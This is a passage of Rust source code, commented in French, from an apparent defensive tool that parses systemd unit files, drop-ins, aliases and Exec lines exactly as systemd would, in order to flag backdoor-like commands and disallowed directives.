    if !texte.contains('$') {
        return variables;
    }
    let nom_de = |p: &Path| p.file_name().map(|n| n.to_string_lossy().into_owned());
    let parent = f.parent().and_then(nom_de);
    let unite = match parent.as_deref().and_then(|p| p.strip_suffix(".d")) {
        Some(u) if a_l_extension(f, "conf") => u.to_string(),
        _ => nom_de(f).unwrap_or_default(),
    };
    let Ok(dossiers) = dossiers_d_unites(r, codes.utilisateur) else {
        return variables;
    };
    let mut principaux = vec![unite.clone()];
    if let Some((gabarit, apres)) = unite.split_once('@')
        && let Some((_, genre)) = apres.rsplit_once('.')
    {
        principaux.push(format!("{gabarit}@.{genre}"));
    }
    let mut textes: Vec<std::path::PathBuf> = Vec::new();
    if let Some(principal) = dossiers
        .iter()
        .flat_map(|d| principaux.iter().map(move |p| d.join(p)))
        .find(|p| p.is_file())
    {
        textes.push(principal);
    }
    for d in &dossiers {
        for ajout in ajouts_de(&unite) {
            let mut confs = fichiers_de(&d.join(ajout), &["conf"]);
            confs.sort();
            textes.extend(confs);
        }
    }
    for autre in textes.iter().filter(|p| p.as_path() != f).take(AJOUTS_MAX) {
        if let Ok(lu) = temoins::lire_borne(autre, AJOUT_MAX) {
            variables_d_unite(&String::from_utf8_lossy(&lu.octets), codes, r, &mut variables);
        }
    }
    variables
}

/// Un mot d'une ligne Exec, ses variables remplacées comme les remplace systemd (« $$ » : « $ » ; « $HOME »
/// gardé) ; `None` si l'une n'a pas de valeur connue.
fn developper_variables(mot: &str, variables: Option<&std::collections::BTreeMap<String, String>>) -> Option<String> {
    if !mot.contains('$') {
        return Some(mot.to_string());
    }
    let mut sortie = String::with_capacity(mot.len());
    let mut reste = mot;
    while let Some(i) = reste.find('$') {
        sortie.push_str(reste.get(..i)?);
        let apres = reste.get(i.saturating_add(1)..)?;
        let (nom, suite) = if let Some(r) = apres.strip_prefix('$') {
            sortie.push('$');
            reste = r;
            continue;
        } else if let Some(r) = apres.strip_prefix('{') {
            let (nom, suite) = r.split_once('}')?;
            (nom, suite)
        } else {
            let n = apres
                .bytes()
                .take_while(|b| b.is_ascii_alphanumeric() || *b == b'_')
                .count();
            if n == 0 {
                sortie.push('$');
                reste = apres;
                continue;
            }
            (apres.get(..n)?, apres.get(n..)?)
        };
        // HOME posé par l'unité : sa valeur (vérification 3, P3) ; sinon celle du compte, gardée en toutes lettres.
        match variables.and_then(|v| v.get(nom)) {
            Some(v) if !v.contains(CODE_INCONNU) => sortie.push_str(v),
            None if nom == "HOME" => sortie.push_str("$HOME"),
            _ => return None,
        }
        reste = suite;
    }
    sortie.push_str(reste);
    Some(sortie)
}

/// Remplace un code dont la valeur ne se connaît pas sans l'unité chargée (nom de l'unité, instance d'un modèle,
/// chemin de son fichier) : un programme ou un script ainsi nommé n'est pas résolu.
const CODE_INCONNU: char = '\u{1}';

/// La valeur après les codes « % » de systemd, remplacés comme il les remplace avant de couper les mots : les
/// dossiers (%h, %T, %V, %t, %S, %C, %L, %E, %D) par leur valeur, les noms (machine, compte…) par un mot sans chemin,
/// ceux de l'unité (%n, %i, %f, %y…) par `CODE_INCONNU`. `None` : un « % » en fin de valeur.
fn developper_codes(valeur: &str, codes: &Codes) -> Option<String> {
    if !valeur.contains('%') {
        return Some(valeur.to_string());
    }
    let (u, m) = (codes.utilisateur, codes.maison.as_str());
    let mut sortie = String::with_capacity(valeur.len());
    let mut lettres = valeur.chars();
    while let Some(c) = lettres.next() {
        if c != '%' {
            sortie.push(c);
            continue;
        }
        let x = lettres.next()?;
        let dossier = |sous: &str, systeme: &str| if u { format!("{m}/{sous}") } else { systeme.to_string() };
        let v = match x {
            '%' => "%".to_string(),
            'h' => {
                if u {
                    m.to_string()
                } else {
                    "/root".to_string()
                }
            }
            'T' => "/tmp".to_string(),
            'V' => "/var/tmp".to_string(),
            // Le dossier de session du compte : /run/user/<uid> (pam_systemd), qu'il soit ou non celui de la lecture.
            't' if u => uid_du_compte().map_or_else(
                || codes.session.clone().unwrap_or_else(|| CODE_INCONNU.to_string()),
                |uid| format!("/run/user/{uid}"),
            ),
            't' => "/run".to_string(),
            'S' => dossier(".local/state", "/var/lib"),
            'C' => dossier(".cache", "/var/cache"),
            'L' => dossier(".local/state/log", "/var/log"),
            'E' => dossier(".config", "/etc"),
            'D' => dossier(".local/share", "/usr/share"),
            's' => "/bin/sh".to_string(),
            'u' | 'U' | 'g' | 'G' | 'H' | 'l' | 'q' | 'b' | 'm' | 'o' | 'v' | 'w' | 'W' | 'A' | 'B' | 'M' | 'a'
            | 'K' => "x".to_string(),
            _ => CODE_INCONNU.to_string(),
        };
        sortie.push_str(&v);
    }
    Some(sortie)
}

/// Les commandes d'une valeur Exec de systemd (après `developper_codes`) telles qu'il les lance (config_parse_exec,
/// systemd 262) : mots coupés sur les blancs hors guillemets (un guillemet au milieu d'un mot compte), échappements
/// décodés (« \x70 », « \160 », « \s », « \u… »), un mot « ; » non échappé qui sépare deux commandes, les préfixes
/// (« -@:+!| ») ôtés du programme, et le nom donné au programme par « @ » ôté. `None` : une forme que Vanguard ne
/// ramène pas à sa forme finale (guillemet non fermé, échappement inconnu, octet nul).
fn commandes_de_systemd(valeur: &str) -> Option<Vec<Vec<String>>> {
    let mut commandes = commandes_de_systemd_brutes(valeur)?;
    for c in &mut commandes {
        let Some(premier) = c.first_mut() else { continue };
        let net = premier.trim_start_matches(['-', '@', '+', '!', ':', '|']).to_string();
        let nom_donne = premier
            .get(..premier.len().saturating_sub(net.len()))
            .is_some_and(|p| p.contains('@'));
        *premier = net;
        if nom_donne && c.len() > 1 {
            c.remove(1);
        }
    }
    commandes.retain(|c| !c.is_empty());
    Some(commandes)
}

/// `commandes_de_systemd` sans toucher aux préfixes du programme (« -@:+!| ») : la liste permise les lit
/// (`permise::exec_systemd`).
fn commandes_de_systemd_brutes(valeur: &str) -> Option<Vec<Vec<String>>> {
    let mut commandes: Vec<Vec<String>> = Vec::new();
    let mut courante: Vec<String> = Vec::new();
    let mut mot = String::new();
    let (mut dans_un_mot, mut litteral) = (false, false);
    let mut guillemet: Option<char> = None;
    let mut lettres = valeur.chars().peekable();
    let chiffres = |lettres: &mut std::iter::Peekable<std::str::Chars<'_>>, n: usize, base: u32| -> Option<u32> {
        let mut v = 0_u32;
        for _ in 0..n {
            v = v.checked_mul(base)?.checked_add(lettres.next()?.to_digit(base)?)?;
        }
        Some(v)
    };
    let lettre = |v: u32| char::from_u32(v).filter(|c| *c != '\0');
    let finir_mot =
        |mot: &mut String, litteral: &mut bool, courante: &mut Vec<String>, commandes: &mut Vec<Vec<String>>| {
            if *mot == ";" && !*litteral {
                commandes.push(std::mem::take(courante));
            } else {
                courante.push(std::mem::take(mot));
            }
            mot.clear();
            *litteral = false;
        };
    while let Some(c) = lettres.next() {
        match (guillemet, c) {
            (Some(q), c) if c == q => guillemet = None,
            (None, '"' | '\'') => {
                guillemet = Some(c);
                dans_un_mot = true;
                litteral = true;
            }
            (None, ' ' | '\t' | '\n' | '\r') => {
                if dans_un_mot {
                    finir_mot(&mut mot, &mut litteral, &mut courante, &mut commandes);
                    dans_un_mot = false;
                }
            }
            (_, '\\') => {
                dans_un_mot = true;
                litteral = true;
                // Un « \ » seul en fin de valeur : systemd refuse la ligne ou le garde tel quel ; aucun ne cache le
                // programme.
                let Some(e) = lettres.next() else {
                    mot.push('\\');
                    break;
                };
                let x = match e {
                    'a' => '\u{7}',
                    'b' => '\u{8}',
                    'f' => '\u{c}',
                    'n' => '\n',
                    'r' => '\r',
                    't' => '\t',
                    'v' => '\u{b}',
                    's' => ' ',
                    // Un séparateur échappé est lui-même (EXTRACT_UNESCAPE_SEPARATORS).
                    '\\' | '"' | '\'' | ';' | ' ' | '\t' => e,
                    'x' => lettre(chiffres(&mut lettres, 2, 16)?)?,
                    'u' => lettre(chiffres(&mut lettres, 4, 16)?)?,
                    'U' => lettre(chiffres(&mut lettres, 8, 16)?)?,
                    '0'..='7' => lettre(
                        e.to_digit(8)?
                            .checked_mul(64)?
                            .checked_add(chiffres(&mut lettres, 2, 8)?)?,
                    )?,
                    _ => return None,
                };
                mot.push(x);
            }
            (_, c) => {
                dans_un_mot = true;
                mot.push(c);
            }
        }
    }
    if guillemet.is_some() {
        return None;
    }
    if dans_un_mot {
        finir_mot(&mut mot, &mut litteral, &mut courante, &mut commandes);
    }
    commandes.push(courante);
    commandes.retain(|c| !c.is_empty());
    Some(commandes)
}

/// Pourquoi une valeur Exec de systemd (ou de .desktop, `codes` absents) ressemble à une porte dérobée une fois
/// ramenée à la forme que lance systemd (`developper_codes`, `commandes_de_systemd`, chemin simplifié), chaque
/// commande d'une ligne « a ; b » jugée ; ou qu'elle ne s'y ramène pas (`Err`) : non résolue, dite.
fn forme_finale_de_systemd(
    valeur: &str,
    codes: Option<&Codes>,
    maisons: &[&str],
    tout_argument: bool,
) -> Result<Option<&'static str>, ()> {
    let developpee = match codes {
        Some(c) => developper_codes(valeur, c).ok_or(())?,
        None => valeur.to_string(),
    };
    for mots in commandes_de_systemd(&developpee).ok_or(())? {
        let programme = mots.first().map(String::as_str).unwrap_or_default();
        let lit = designes::lit_un_script(programme) || enveloppe(programme);
        if programme.contains(CODE_INCONNU) || (lit && mots.iter().any(|m| m.contains(CODE_INCONNU))) {
            return Err(());
        }
        let jointe = mots.join(" ");
        if let Some(raison) = commande_suspecte_chez(&jointe, true, maisons) {
            return Ok(Some(raison));
        }
        // Les variables de l'unité remplacées, chaque mot jugé comme une commande simple du shell : « sh -c ligne »
        // y est lue comme une ligne de shell.
        let simple = shell::Simple {
            mots: mots
                .iter()
                .map(|m| match developper_variables(m, codes.map(|c| &c.variables)) {
                    Some(texte) => shell::Mot {
                        texte,
                        flou: shell::Flou::Aucun,
                    },
                    None => shell::Mot {
                        texte: m.clone(),
                        flou: shell::Flou::Variable,
                    },
                })
                .collect(),
            entrees: Vec::new(),
        };
        if let Some(raison) = simple_suspecte(&simple, &mut Courant::Maison, maisons, tout_argument, 0)? {
            return Ok(Some(raison));
        }
    }
    Ok(None)
}

/// Les lignes d'une unité ou d'un ajout telles que systemd les lit (`lignes_de_systemd`), leur seul texte.
fn lignes_logiques(texte: &str) -> Vec<String> {
    lignes_de_systemd(texte).into_iter().map(|l| l.texte).collect()
}

/// Une ligne d'unité telle que systemd la lit (`lignes_de_systemd`).
struct LigneDeSystemd {
    /// Le numéro de sa première ligne, compté en « \n » comme dans un éditeur (à partir de 1).
    numero: usize,
    /// Combien de lignes lues par systemd elle joint.
    lues: usize,
    /// Sa première ligne lue, telle qu'écrite.
    premiere: String,
    /// Son texte, joint et sans blancs autour.
    texte: String,
}

/// Les lignes d'une unité, d'un ajout ou d'un .desktop comme les assemble systemd (`config_parse`, systemd 262) :
/// lues par `lignes_lues_par_systemd`, une ligne dont le premier caractère non blanc est « # » ou « ; » sautée (même
/// au milieu d'une ligne continuée), la marque d'ordre des octets ôtée en tête de chaque ligne lue, une ligne qui finit
/// par un « \ » non échappé (« \\ » ne continue pas, « \ » suivi d'un blanc non plus) continuée par la suivante, ce
/// « \ » remplacé par une espace ; une ligne vide finit la continuation, une continuation restée ouverte à la fin du
/// fichier compte. Le texte final perd ses blancs autour (espace, tabulation, « \n », « \r ») ; une ligne vide se saute.
/// Rien de plus joint que par systemd : un « \ » joint en trop cacherait la ligne suivante dans la précédente.
fn lignes_de_systemd(texte: &str) -> Vec<LigneDeSystemd> {
    const BLANCS: [char; 4] = [' ', '\t', '\n', '\r'];
    let mut sortie = Vec::new();
    let mut finir = |mut l: LigneDeSystemd| {
        let net = l.texte.trim_matches(BLANCS);
        if !net.is_empty() {
            l.texte = net.to_string();
            sortie.push(l);
        }
    };
    let mut cours: Option<LigneDeSystemd> = None;
    // Le numéro en « \n » d'un octet, compté au fil de la lecture (jamais tout le début à chaque ligne).
    let (mut compte, mut jusqu_a) = (1_usize, 0_usize);
    for (debut, brute) in lignes_lues_par_systemd(texte) {
        compte = compte.saturating_add(texte.get(jusqu_a..debut).map_or(0, |a| a.matches('\n').count()));
        jusqu_a = debut;
        if brute
            .trim_start_matches('\u{FEFF}')
            .trim_start_matches(BLANCS)
            .starts_with(['#', ';'])
        {
            continue;
        }
        // systemd 262 ôte la marque d'ordre des octets en tête de chaque ligne lue, pas seulement de la première
        // (relecture adverse, C1) : « \u{FEFF}ExecStart=… » au milieu d'une unité est une ligne Exec.
        let l = brute.strip_prefix('\u{FEFF}').unwrap_or(brute);
        let mut ligne = match cours.take() {
            Some(mut c) => {
                c.texte.push_str(l);
                c.lues = c.lues.saturating_add(1);
                c
            }
            None => LigneDeSystemd {
                numero: compte,
                lues: 1,
                premiere: brute.to_string(),
                texte: l.to_string(),
            },
        };
        // L'échappement se lit sur le seul morceau ajouté : le texte d'avant finit par l'espace mise à la place
        // de son « \ », donc sans échappement en cours (systemd relit tout, pour le même résultat).
        let mut echappe = false;
        for c in l.chars() {
            echappe = !echappe && c == '\\';
        }
        if echappe {
            ligne.texte.pop();
            ligne.texte.push(' ');
            cours = Some(ligne);
        } else {
            finir(ligne);
        }
    }
    if let Some(c) = cours {
        finir(c);
    }
    sortie
}

/// Les lignes que lit systemd (`read_line`), chacune avec l'octet où elle commence : une fin de ligne est « \n »,
/// « \r » ou « \0 » ; des fins de sortes différentes à la suite (« \r\n », « \n\r », « \n\0 ») n'en font qu'une, la
/// même sorte deux fois en fait deux, et « \0 » finit la sienne aussitôt.
fn lignes_lues_par_systemd(texte: &str) -> Vec<(usize, &str)> {
    let sorte = |b: u8| match b {
        b'\n' => 1_u8,
        b'\r' => 2,
        0 => 4,
        _ => 0,
    };
    let octets = texte.as_bytes();
    let mut lignes = Vec::new();
    let (mut debut, mut i) = (0_usize, 0_usize);
    while let Some(&b) = octets.get(i) {
        let mut vues = sorte(b);
        i = i.saturating_add(1);
        if vues == 0 {
            continue;
        }
        // Les fins de ligne sont de l'ASCII : les bornes tombent entre deux caractères.
        lignes.push((debut, texte.get(debut..i.saturating_sub(1)).unwrap_or_default()));
        while vues & 4 == 0
            && let Some(&b) = octets.get(i)
        {
            let s = sorte(b);
            if s == 0 || vues & s != 0 {
                break;
            }
            vues |= s;
            i = i.saturating_add(1);
        }
        debut = i;
    }
    if debut < octets.len() {
        lignes.push((debut, texte.get(debut..).unwrap_or_default()));
    }
    lignes
}

/// Les lignes Exec*= d'une unité ou d'un ajout : la directive, sa commande, la ligne entière.
fn lignes_exec(texte: &str) -> Vec<(String, String, String)> {
    lignes_logiques(texte)
        .into_iter()
        .filter_map(|l| {
            let (cle, valeur) = l.split_once('=')?;
            let cle = cle.trim_matches([' ', '\t']);
            DIRECTIVES_EXEC
                .contains(&cle)
                .then(|| (cle.to_string(), valeur.trim_matches([' ', '\t']).to_string(), l.clone()))
        })
        .collect()
}

/// La valeur d'une variable permise, sans chemin : un chemin (« LC_ALL=/x », « LANGUAGE=../x ») ferait lire un
/// fichier que rien ne lie. Seul TZ garde un nom de zone (« America/Toronto »), lu sous les zones du système, sans
/// « : » ni « .. » ni chemin absolu (deuxième vérification de la campagne E).
fn valeur_permise(nom: &str, valeur: &str) -> bool {
    if nom == "TZ" {
        return !valeur.starts_with('/')
            && valeur.split('/').all(|p| {
                !p.is_empty() && p != ".." && p.bytes().all(|o| o.is_ascii_alphanumeric() || b"-_+".contains(&o))
            })
            || valeur.is_empty();
    }
    !valeur.contains(['/', '\\'])
}

/// La première directive d'une unité ou d'un ajout qui n'est pas dans la liste fermée (`DIRECTIVES_PERMISES`), ou
/// qui y est avec une valeur hors des permises (une dépendance qui n'est pas une cible, une ligne Exec vide qui
/// efface les précédentes, une variable hors de `variable_permise` ou avec un chemin), telle qu'à montrer.
fn directive_refusee(texte: &str) -> Option<String> {
    let mut section: Option<&str> = None;
    let logiques = lignes_logiques(texte);
    for l in &logiques {
        if let Some(nom) = l.strip_prefix('[').and_then(|x| x.strip_suffix(']')) {
            match DIRECTIVES_PERMISES.iter().find(|(s, _)| *s == nom) {
                Some((s, _)) => section = Some(s),
                None => return Some(format!("[{}]", crate::ui::affichable(nom))),
            }
            continue;
        }
        let Some((cle, valeur)) = l.split_once('=') else {
            return Some(crate::ui::couper(&crate::ui::affichable(l), 40));
        };
        let cle = cle.trim_matches([' ', '\t']);
        let valeur = valeur.trim_matches([' ', '\t']);
        let permise = section.is_some_and(|s| {
            DIRECTIVES_PERMISES
                .iter()
                .any(|(n, cles)| *n == s && cles.contains(&cle))
        });
        if !permise {
            return Some(format!("{}=", crate::ui::affichable(cle)));
        }
        if ["Wants", "Requires", "PartOf", "WantedBy"].contains(&cle) && !dependance_permise(valeur) {
            return Some(format!(
                "{cle}={}",
                crate::ui::couper(&crate::ui::affichable(valeur), 40)
            ));
        }
        if DIRECTIVES_EXEC.contains(&cle) && valeur.is_empty() {
            return Some(format!("{cle}= ({})", tr!("vide", "empty")));
        }
        if cle == "Environment" || cle == "PassEnvironment" {
            let Some(mots) = mots_de_systemd(valeur) else {
                return Some(format!("{cle}=\\…"));
            };
            for mot in mots {
                let (nom, v) = mot.split_once('=').unwrap_or((&mot, ""));
                if !variable_permise(nom) || !valeur_permise(nom, v) {
                    return Some(format!("{cle}={}", crate::ui::affichable(nom)));
                }
            }
        }
    }
    None
}

/// Les dossiers où systemd cherche les unités, du plus prioritaire au moins prioritaire (systemd.unit(5)).
fn dossiers_d_unites(r: &Releveur, utilisateur: bool) -> Result<Vec<std::path::PathBuf>, temoins::Refus> {
    let s = |c: &str| r.sous(Path::new(c));
    if !utilisateur {
        return Ok([
            "/etc/systemd/system.control",
            "/run/systemd/system.control",
            "/run/systemd/transient",
            "/run/systemd/generator.early",
            "/etc/systemd/system",
            "/etc/systemd/system.attached",
            "/run/systemd/system",
            "/run/systemd/generator",
            "/usr/local/lib/systemd/system",
            "/usr/lib/systemd/system",
            "/run/systemd/generator.late",
        ]
        .iter()
        .map(|c| s(c))
        .collect());
    }
    let Some(session) = r.runtime.as_deref() else {
        return Err(temoins::Refus(
            tr!(
                "le dossier de la session (XDG_RUNTIME_DIR) est inconnu : ce que systemd y ajoute à l'unité ne se vérifie pas",
                "the session folder (XDG_RUNTIME_DIR) is unknown: what systemd adds to the unit there cannot be checked"
            )
            .to_string(),
        ));
    };
    // Le dossier de session que systemd donne au compte (/run/user/<uid>), s'il n'est pas XDG_RUNTIME_DIR : c'est le
    // seul que le gestionnaire de la session lit, à sa place dans l'ordre (en fin de liste, une unité de
    // /run/user/<uid>/systemd/user passait après celle du système au même nom et `vanguard demarrage` la taisait :
    // relecture 0.94, D-2). Celui de la variable se lit juste après, par prudence.
    let run = |c: &str| -> Vec<std::path::PathBuf> {
        r.session_de_systemd
            .as_deref()
            .into_iter()
            .chain(std::iter::once(session))
            .map(|b| r.sous(&b.join(c)))
            .collect()
    };
    let m = |c: &str| vec![r.maison.join(c)];
    let sy = |c: &str| vec![s(c)];
    // Un XDG_CONFIG_HOME ou XDG_DATA_HOME déplacé : systemd y cherche aussi, en plus des dossiers par défaut (que le
    // gestionnaire de la session lit peut-être, sans ces variables).
    let x = |base: &Option<std::path::PathBuf>, c: &str| -> Vec<std::path::PathBuf> {
        base.iter().map(|b| r.sous(&b.join(c))).collect()
    };
    let liste = |base: &[std::path::PathBuf]| -> Vec<std::path::PathBuf> {
        base.iter().map(|d| r.sous(&d.join("systemd/user"))).collect()
    };
    // La liste de systemd (« systemd-analyze --user unit-paths », systemd 262) : chaque XDG_CONFIG_DIRS, puis
    // /etc/xdg ; chaque XDG_DATA_DIRS après ~/.local/share (relecture adverse, B5).
    let mut dossiers: Vec<std::path::PathBuf> = [
        m(".config/systemd/user.control"),
        x(&r.config, "systemd/user.control"),
        run("systemd/user.control"),
        run("systemd/transient"),
        run("systemd/generator.early"),
        m(".config/systemd/user"),
        x(&r.config, "systemd/user"),
        m(".config/systemd/user.attached"),
        x(&r.config, "systemd/user.attached"),
        liste(&r.config_systeme),
        sy("/etc/xdg/systemd/user"),
        sy("/etc/systemd/user"),
        run("systemd/user"),
        run("systemd/user.attached"),
        sy("/run/systemd/user"),
        run("systemd/generator"),
        m(".local/share/systemd/user"),
        x(&r.donnees, "systemd/user"),
        liste(&r.donnees_systeme),
        sy("/usr/local/share/systemd/user"),
        sy("/usr/share/systemd/user"),
        sy("/usr/local/lib/systemd/user"),
        sy("/usr/lib/systemd/user"),
        run("systemd/generator.late"),
    ]
    .into_iter()
    .flatten()
    .collect();
    let mut vus = std::collections::BTreeSet::new();
    dossiers.retain(|d| vus.insert(d.clone()));
    Ok(dossiers)
}

/// Les noms des dossiers d'ajout qui s'appliquent à l'unité `nom` : « a-b.service.d », « a-.service.d »,
/// « service.d », et pour une instance « a@.service.d ».
fn ajouts_de(nom: &str) -> Vec<String> {
    let mut noms = vec![format!("{nom}.d")];
    if let Some((base, genre)) = nom.rsplit_once('.') {
        for (i, _) in base.match_indices('-') {
            if let Some(p) = base.get(..=i) {
                noms.push(format!("{p}.{genre}.d"));
            }
        }
        if let Some((gabarit, _)) = base.split_once('@') {
            noms.push(format!("{gabarit}@.{genre}.d"));
        }
        noms.push(format!("{genre}.d"));
    }
    noms.sort();
    noms.dedup();
    noms
}

/// Un fichier d'ajout, ou l'unité d'un ajout : son état, une fois ses directives vérifiées, et son texte (vide pour
/// un ajout absent ou masqué). Un ajout masqué (lien vers /dev/null) ne compte pas, et se lie comme tel.
fn lire_ajout(r: &Releveur, f: &Path) -> Result<(temoins::Etat, String), temoins::Refus> {
    let montre = || crate::ui::affichable(&r.montre(f));
    if std::fs::read_link(f).is_ok_and(|v| v == Path::new("/dev/null")) {
        let masque = temoins::Etat::Lien {
            vers: "/dev/null".into(),
            puis: Box::new(temoins::Etat::Absent),
            vu: std::fs::symlink_metadata(f)
                .map(|m| temoins::Vu::de_dans(&m, f))
                .unwrap_or_default(),
        };
        return Ok((masque, String::new()));
    }
    let lu = match temoins::lire_borne(f, AJOUT_MAX) {
        Ok(lu) => lu,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok((temoins::Etat::Absent, String::new())),
        Err(e) => {
            return Err(temoins::Refus(trf!(
                "{} ne se lit pas ({e})",
                "{} cannot be read ({e})",
                montre()
            )));
        }
    };
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{} est trop gros pour être relu à chaque bilan",
            "{} is too large to be re-read at each check",
            montre()
        )));
    }
    let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
        return Err(octet_refuse(&montre()));
    };
    if let Some(d) = directive_refusee(texte) {
        return Err(refus_directive(&montre(), &d));
    }
    Ok((temoins::etat_du_contenant(f, &lu.octets)?, texte.to_string()))
}

/// Au plus autant de noms pour une unité (elle et ses alias) : au-delà, la chaîne est trop longue pour se suivre.
const ALIAS_MAX: usize = 32;

/// L'unité `nom` et chacun de ses alias, jusqu'au bout : un lien d'un dossier d'unités vers elle sous un autre nom,
/// ou vers un de ses alias (« alias2 -> alias -> rappel ») ; systemd applique aussi les ajouts posés sous chacun de
/// ces noms, jusque dans le dossier de la session (campagne E, F5 ; vérification, N6). `vraie` : le fichier de
/// l'unité que systemd lance. `Err` : un nom qui n'est pas de l'UTF-8, un lien qui boucle, ou trop d'alias.
fn alias_de(
    r: &Releveur,
    dossiers: &[std::path::PathBuf],
    nom: &str,
    vraie: Option<&Path>,
) -> Result<Vec<String>, temoins::Refus> {
    let vraie = vraie.and_then(|f| std::fs::canonicalize(f).ok());
    // Chaque lien des dossiers d'unités : son nom, son chemin, le nom vers lequel il mène.
    let mut liens: Vec<(String, std::path::PathBuf, Option<std::ffi::OsString>)> = Vec::new();
    for d in dossiers {
        for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
            let n = e.file_name();
            // Un nom qui n'est pas de l'UTF-8 ne se compare pas : un alias ainsi nommé échapperait (F1).
            let Some(n) = n.to_str() else {
                return Err(octet_refuse(&crate::ui::affichable(&r.montre(&e.path()))));
            };
            let Ok(vers) = std::fs::read_link(e.path()) else {
                continue;
            };
            liens.push((
                n.to_string(),
                e.path(),
                vers.file_name().map(std::ffi::OsStr::to_os_string),
            ));
        }
    }
    // L'ordre des noms, pas celui du système de fichiers : un même refus quel que soit le disque.
    liens.sort();
    let mut noms = vec![nom.to_string()];
    // Jusqu'au point fixe : chaque tour ajoute au moins un nom, ou s'arrête ; au plus un tour par lien.
    loop {
        let mut ajoute = false;
        for (n, chemin, vers) in &liens {
            if noms.contains(n) {
                continue;
            }
            let meme_nom = vers
                .as_ref()
                .and_then(|v| v.to_str())
                .is_some_and(|v| noms.iter().any(|x| x == v));
            let meme_fichier = match (&vraie, std::fs::canonicalize(chemin)) {
                (_, Err(e)) if e.raw_os_error() == Some(libc::ELOOP) => {
                    return Err(temoins::Refus(trf!(
                        "{} est un lien qui boucle",
                        "{} is a link that loops",
                        crate::ui::affichable(&r.montre(chemin))
                    )));
                }
                (Some(v), Ok(c)) => c == *v,
                _ => false,
            };
            if meme_nom || meme_fichier {
                if noms.len() >= ALIAS_MAX {
                    return Err(temoins::Refus(trf!(
                        "{} a plus de {ALIAS_MAX} alias : la chaîne est trop longue pour se suivre",
                        "{} has more than {ALIAS_MAX} aliases: the chain is too long to follow",
                        crate::ui::affichable(nom)
                    )));
                }
                noms.push(n.clone());
                ajoute = true;
            }
        }
        if !ajoute {
            return Ok(noms);
        }
    }
}

fn refus_directive(fichier: &str, directive: &str) -> temoins::Refus {
    temoins::Refus(trf!(
        "{fichier} : « {directive} » est hors de la courte liste de ce qui se déclare normal dans une unité (décrire, ordonner, relancer, lignes Exec liées) : ce qu'elle change ne se lie pas",
        "{fichier}: “{directive}” is outside the short list of what can be declared normal in a unit (describe, order, restart, bound Exec lines): what it changes cannot be bound"
    ))
}

/// Pour la ligne `ligne` de l'unité systemd `fichier` (dont `texte` est le contenu lu ; `None` : chaque ligne Exec du
/// fichier est déjà liée par l'appelant) : ce qui change ce que l'unité
/// lance sans toucher à la ligne. Refusé : une unité du même nom dans un dossier qui passe avant, une directive hors
/// de la liste fermée (`directive_refusee`), trop d'ajouts. Lié : chaque fichier d'ajout (drop-in) de chaque dossier
/// de systemd, pour une ligne d'un ajout l'unité elle-même, et ce que lance chaque autre ligne Exec*= de l'unité et
/// de ses ajouts (ExecStartPre=, ExecStop=…), montrée avec ce qu'elle lance : la ligne acceptée n'est pas la seule
/// que l'unité exécute (deuxième vérification de la campagne E, P2).
fn unite(
    r: &mut Releveur,
    fichier: &Path,
    texte: &str,
    utilisateur: bool,
    ligne: Option<&str>,
) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
    if let Some(d) = directive_refusee(texte) {
        return Err(refus_directive(&crate::ui::affichable(&r.montre(fichier)), &d));
    }
    let parent = fichier.parent().unwrap_or(Path::new("/"));
    let nom_du_parent = parent.file_name().map(|n| n.to_string_lossy().into_owned());
    let (nom, dossier, ajout) = match nom_du_parent.as_deref().and_then(|n| n.strip_suffix(".d")) {
        Some(n) => (n.to_string(), parent.parent().unwrap_or(Path::new("/")), true),
        None => (
            fichier
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default(),
            parent,
            false,
        ),
    };
    let dossiers = dossiers_d_unites(r, utilisateur)?;
    let mut lies = Vec::new();
    // Chaque texte de l'unité telle que systemd l'assemble : le fichier de la ligne, l'unité d'un ajout, les ajouts.
    let mut textes: Vec<(std::path::PathBuf, String)> = vec![(fichier.to_path_buf(), texte.to_string())];
    // L'unité que systemd lance : la première de ce nom dans l'ordre de ses dossiers.
    let premiere = dossiers
        .iter()
        .find(|d| std::fs::symlink_metadata(d.join(&nom)).is_ok());
    if !ajout {
        if let Some(d) = premiere.filter(|d| d.as_path() != dossier) {
            return Err(temoins::Refus(trf!(
                "une unité du même nom dans {} passe avant {} : c'est elle que systemd lance",
                "a unit of the same name in {} takes precedence over {}: that is the one systemd starts",
                crate::ui::affichable(&r.montre(d)),
                crate::ui::affichable(&r.montre(fichier))
            )));
        }
    } else if let Some(d) = premiere {
        let f = d.join(&nom);
        let (etat, t) = lire_ajout(r, &f)?;
        lies.push((r.montre(&f), etat));
        textes.push((f, t));
    }
    let mut noms = Vec::new();
    for n in alias_de(r, &dossiers, &nom, premiere.map(|d| d.join(&nom)).as_deref())? {
        noms.extend(ajouts_de(&n));
    }
    noms.sort();
    noms.dedup();
    // Une ligne d'un gabarit (« a@.service ») vaut pour chaque instance : leurs ajouts (« a@x.service.d ») aussi.
    let instances = nom
        .rsplit_once('.')
        .and_then(|(b, g)| b.strip_suffix('@').map(|b| (format!("{b}@"), format!(".{g}.d"))));
    let illisible = |d: &Path, e: std::io::Error| {
        temoins::Refus(trf!(
            "{} ne se lit pas ({e})",
            "{} cannot be read ({e})",
            crate::ui::affichable(&r.montre(d))
        ))
    };
    let mut ajouts = Vec::new();
    for d in &dossiers {
        let entrees = match std::fs::read_dir(d) {
            Ok(e) => e,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => return Err(illisible(d, e)),
        };
        for e in entrees.flatten() {
            let n = e.file_name().to_string_lossy().into_owned();
            let s_applique = noms.contains(&n)
                || instances
                    .as_ref()
                    .is_some_and(|(debut, fin)| n.starts_with(debut.as_str()) && n.ends_with(fin.as_str()));
            if !s_applique || !std::fs::metadata(e.path()).is_ok_and(|m| m.is_dir()) {
                continue;
            }
            for c in std::fs::read_dir(e.path())
                .map_err(|x| illisible(&e.path(), x))?
                .flatten()
            {
                if c.file_name().to_string_lossy().ends_with(".conf") {
                    ajouts.push(c.path());
                }
            }
        }
    }
    ajouts.sort();
    ajouts.dedup();
    ajouts.retain(|a| a != fichier);
    if ajouts.len() > AJOUTS_MAX {
        return Err(temoins::Refus(trf!(
            "{} fichiers d'ajout pour cette unité, plus que les {AJOUTS_MAX} qui se relisent à chaque bilan",
